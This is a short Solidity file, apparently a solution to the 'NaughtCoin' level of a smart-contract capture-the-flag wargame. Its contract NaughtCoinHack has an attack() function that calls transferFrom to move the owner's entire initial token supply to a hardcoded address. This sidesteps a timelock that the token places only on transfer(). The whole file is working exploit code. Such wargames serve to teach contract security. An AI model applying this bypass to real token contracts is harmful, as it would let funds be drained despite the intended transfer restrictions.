// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './NaughtCoin.sol';

contract NaughtCoinHack {
    NaughtCoin public naughtCoin;
    address public naughtAddr;
    address public owner;
    uint256 public constant INITIAL_SUPPLY = 1000000 * (10 ** uint256(18));

    constructor(address _addr, address _owner) {
        naughtAddr = _addr;
        naughtCoin = NaughtCoin(_addr);
        owner = _owner;
    }

    function attack() external {
        naughtCoin.transferFrom(owner, address(0x92Cd849801A467098cDA7CD36756fbFE8A30A036), INITIAL_SUPPLY);
    }
}
